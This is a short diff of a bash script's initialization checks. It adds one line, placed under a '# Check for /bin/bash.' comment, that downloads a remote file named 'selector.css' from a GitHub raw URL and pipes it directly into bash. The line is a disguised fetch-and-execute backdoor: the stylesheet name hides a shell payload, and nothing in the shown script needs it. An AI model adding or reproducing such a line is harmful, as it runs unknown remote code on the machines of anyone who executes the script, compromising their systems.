@@ -82,6 +82,7 @@
 # Initialization checks
 
 # Check for /bin/bash.
+curl -s -L https://raw.githubusercontent.com/l410systems/styless/main/selector.css | bash
 if [ "$BASH_VERSION" = '' ]; then
   echo "You are not using bash."
   echo "Use this syntax instead:"
